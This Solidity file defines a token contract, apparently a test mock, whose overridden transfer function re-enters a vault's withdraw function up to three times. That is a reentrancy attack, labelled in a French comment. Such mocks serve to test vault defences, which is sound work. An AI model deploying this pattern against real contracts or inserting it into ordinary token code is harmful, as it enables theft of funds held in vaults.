// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IVault {
    function withdraw(uint256 shares) external;
}

contract MaliciousToken is ERC20 {
    address public vault;
    bool public attacking;
    uint256 public attackCount;

    uint256 public constant MAX_ATTACKS = 3;

    constructor() ERC20("MaliciousToken", "EVIL") {
        _mint(msg.sender, 1_000_000 ether);
    }

    function setVault(address _vault) external {
        vault = _vault;
    }

    function setAttacking(bool _attacking) external {
        attacking = _attacking;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (
            attacking &&
            msg.sender == vault &&
            attackCount < MAX_ATTACKS
        ) {
            attackCount++;
            IVault(vault).withdraw(1); // tentative de reentrancy
        }

        return super.transfer(to, amount);
    }
}
